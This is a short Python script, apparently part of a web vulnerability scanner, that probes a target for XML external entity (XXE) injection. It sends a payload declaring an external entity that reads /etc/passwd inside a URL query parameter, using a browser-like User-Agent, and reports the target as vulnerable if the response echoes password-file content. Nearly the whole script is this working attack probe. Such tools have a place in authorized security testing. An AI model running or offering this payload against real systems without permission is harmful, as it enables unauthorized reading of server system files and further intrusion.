import requests
from colorama import Fore, Style, init

init(autoreset=True)

def xxe_scan(target, verbose=False):
    print(Fore.CYAN + "[XXE SCAN STARTED]")
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0'})

    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>'''

    try:
        url = f"{target.rstrip('/')}?xml={xxe_payload}"
        response = session.get(url, timeout=5)
        if 'root:' in response.text or 'passwd' in response.text:
            print(Fore.RED + f"[XXE VULN] {url}")
        else:
            print(Fore.GREEN + "[XXE] No vulnerabilities found")
    except Exception as e:
        print(Fore.RED + f"[ERROR] {e}")

    print(Fore.CYAN + "[XXE SCAN COMPLETED]")